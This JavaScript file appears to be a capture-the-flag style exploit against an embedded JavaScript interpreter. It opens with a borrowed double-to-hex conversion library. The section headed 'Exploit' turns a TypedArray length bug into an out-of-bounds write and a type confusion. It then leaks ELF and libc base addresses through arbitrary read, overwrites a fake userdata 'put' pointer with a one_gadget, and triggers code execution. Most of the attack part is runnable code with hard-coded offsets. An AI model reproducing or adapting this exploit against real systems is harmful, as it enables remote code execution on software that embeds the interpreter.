/**
 * A library that allow conversion of double to byteArray and vis versa.
 * Extracted from "JRS - JavaScript Exact Arithmetic - J R Stockton (See
 * http://www.merlyn.demon.co.uk/js-exact.htm#DW4 and 
 * http://www.merlyn.demon.co.uk/contents.htm#Copy).
 */

JRS = function () {
  function numberToBinString(number, binStringLength) {
    var A = [], T = null; // number>=0
    while (binStringLength--) {
      T = number % 2;
      A[binStringLength] = T;
      number -= T;
      number /= 2;
    }
    return A.join("");
  }

  function HexFn(fourBitsBinString) {
    return parseInt(fourBitsBinString, 2).toString(16);
  }

  function binStringToHexString(binString) {
    return binString.replace(/(\d{4})/g, HexFn);
  }

  function hexStringToBinString(hexString) {
    var binString = "";

    for (var i = 0; i < hexString.length - 1; i += 2) {
      binString += numberToBinString(parseInt(hexString.substr(i, 2), 16), 8);
    }

    return binString;
  }

  function SngFwd(Sg, Ex, Mt) {
    var B = {};
    Mt = Math.pow(2, 23) * Mt + 0.5; // round
    B.a = 0xFF & Mt;
    B.b = 0xFF & (Mt >> 8);
    B.c = 0x7F & (Mt >> 16) | (Ex & 1) << 7;
    B.d = Sg << 7 | (Ex >> 1);
    return B;
  }

  function DblFwd(Sg, Ex, Mt) {
    var B = {};
    Mt = Math.pow(2, 52) * Mt;
    B.a = 0xFFFF & Mt;
    B.b = 0xFFFF & (Mt >> 16);
    Mt /= Math.pow(2, 32); // Integers are only 32-bit
    B.c = 0xFFFF & Mt;
    B.d = Sg << 15 | Ex << 4 | 0x000F & (Mt >> 16);
    return B;
  }

  function CVTFWD(NumW, Qty) { // Function now without side-effects
    var Sign = null, Expo = null, Mant = null, Bin = null, nb01 = ""; // , OutW = NumW/4
    var Inf = {
      32: { d: 0x7F, c: 0x80, b: 0, a: 0 },
      64: { d: 0x7FF0, c: 0, b: 0, a: 0 }
    };
    var ExW = { 32: 8, 64: 11 }[NumW], MtW = NumW - ExW - 1;

    if (isNaN(Qty)) {
      Bin = Inf[NumW];
      Bin.a = 1;
      Sign = false;
      Expo = Math.pow(2, ExW) - 1;
      Mant = Math.pow(2, -MtW);
    }

    if (!Bin) {
      Sign = Qty < 0 || 1 / Qty < 0; // OK for +-0
      if (!isFinite(Qty)) {
        Bin = Inf[NumW];
        if (Sign)
          Bin.d += 1 << (NumW / 4 - 1);
        Expo = Math.pow(2, ExW) - 1;
        Mant = 0;
      }
    }

    if (!Bin) {
      Expo = { 32: 127, 64: 1023 }[NumW];
      Mant = Math.abs(Qty);
      while (Mant >= 2) {
        Expo++;
        Mant /= 2;
      }
      while (Mant < 1 && Expo > 0) {
        Expo--;
        Mant *= 2;
      }
      if (Expo <= 0) {
        Mant /= 2;
        nb01 = "Zero or Denormal";
      }
      if (NumW == 32 && Expo > 254) {
        nb01 = "Too big for Single";
        Bin = {
          d: Sign ? 0xFF : 0x7F,
          c: 0x80,
          b: 0,
          a: 0
        };
        Expo = Math.pow(2, ExW) - 1;
        Mant = 0;
      }
    }

    if (!Bin)
      Bin = { 32: SngFwd, 64: DblFwd }[NumW](Sign, Expo, Mant);

    Bin.sgn = +Sign;
    Bin.exp = numberToBinString(Expo, ExW);
    Mant = (Mant % 1) * Math.pow(2, MtW);
    if (NumW == 32)
      Mant = Math.floor(Mant + 0.5);
    Bin.mnt = numberToBinString(Mant, MtW);
    Bin.nb01 = nb01;
    return Bin;
  }

  function CVTREV(BinStr) {
    var ExW = { 32: 8, 64: 11 }[BinStr.length];
    var M = BinStr.match(new RegExp("^(.)(.{" + ExW + "})(.*)$"));
    // M1 sign, M2 exponent, M3 mantissa

    var Sign = M[1] == "1" ? -1 : +1;

    if (!/0/.test(M[2])) { // NaN or Inf
      var X = /1/.test(M[3]) ? NaN : Sign / 0;
      throw new Error("Max Coded " + M[3] + " " + X.toString());
    }

    var Denorm = +M[2] == 0;
    if (Denorm) {
      console.log("Zero or Denormal");
    }

    var Expo = parseInt(M[2], 2) - Math.pow(2, ExW - 1) + 1;
    var Mant = parseInt(M[3], 2) / Math.pow(2, M[3].length) + !Denorm;
    return Sign * Mant * Math.pow(2, Expo + Denorm);
  }

  this.doubleToHexString = function ( /* double */d, /* int */size) {
    var NumW = size;
    var Qty = d;
    with (CVTFWD(NumW, Qty)) {
      return binStringToHexString(sgn + exp + mnt);
    }
  };

  this.hexStringToDouble = function (/*String*/hexString, /*int*/size) {
    var NumW = size;
    var binString = hexStringToBinString(hexString);
    var X = new RegExp("^[01]{" + NumW + "}$");
    if (!X.test(binString)) {
      alert(NumW + " bits 0/1 needed");
      return;
    }
    return CVTREV(binString);
  };
};
jrs = new JRS();

// Exploit

/**
 * Bug: public/jsUint16Array.c:19:30
 * On create a new Uint16Array with TypedArray, length has assigned to byteLength, which is obviously divergent:
 * ArrayBuffer(2).length == 2 bytes && Uint16Array(2).length == 4 bytes
 * Target using jemalloc
*/

/**
 * Strategy:
 * Cause a type confusion with OOB array overwriting "js_Object->type" using .set(idx, enum::JS_CNUMBER)
*/

// helpers

JS_CNUMBER = 7
JS_CUINT32ARRAY = 18
type_corrupt_idx = 56
one_gadget = 0xebcf8

function set64(idx, val) {
  hex = val.toString(16);
  hex = '0' * (16 - hex.length) + hex;
  lower = parseInt(hex.slice(-8), 16);
  higher = parseInt(hex.slice(0, -8), 16);
  arr.set(idx, lower);
  arr.set(idx + 1, higher);
}

function readPtr(poison_str) {
  out = "";
  encoded = encodeURI(poison_str);
  i = 0;
  while (i < encoded.length) {
    if (encoded[i] == "%") {
      out = encoded.slice(i + 1, i + 3) + out;
      i += 3;
    } else {
      out = encoded.charCodeAt(i).toString(16) + out;
      i += 1;
    }
  }

  return parseInt(out, 16);
}

function read(addr) {
  set64(148, addr);
  return readPtr(controlstring);
}

// sizeof(js_Object) == 0x68
buf = new ArrayBuffer(0x64); // 0x64 to stay in same js objects slabs
arr = new Uint16Array(buf);
buf2 = new ArrayBuffer(0x64);
arr2 = new Uint16Array(buf);
controlstring = new String("r3tr0");

arr.set(type_corrupt_idx, JS_CNUMBER); // arr now is JS_CNUMBER
arr.valueOf = Number.prototype.valueOf;
arr_ptr = parseInt(jrs.doubleToHexString(arr.valueOf(), 64), 16)
arr2.set(type_corrupt_idx, JS_CUINT32ARRAY); // arr now is JS_CUINT32ARRAY
arr.set = Uint32Array.prototype.set;
// mark to search in gdb
// arr.set(0, 0xdeadbeef);
arr.set(38, 1000); // arr.length = 1000

print("arr arr: 0x" + arr_ptr.toString(16));
exe_base = read(arr_ptr + 0xe8) - 0x460a0;
exit_got = exe_base + 0x45f88;
libc_base = read(exit_got) - 0x455f0;
one_gadget = libc_base + one_gadget;

print("elf base: 0x" + exe_base.toString(16));
print("libc base: 0x" + libc_base.toString(16));
print("one_gadget: 0x" + one_gadget.toString(16));

/**
 * Use arb r/w to create fake object userdata with poisoned "put" function, transforming `buf2[""] = ""` in rce:
 * obj->u.user.put(J, obj->u.user.data, name)
 */
set64(56, 0x000000010000000f)
set64(64, 0);
set64(66, 0);
set64(70, one_gadget);

buf2[""] = "pwned";
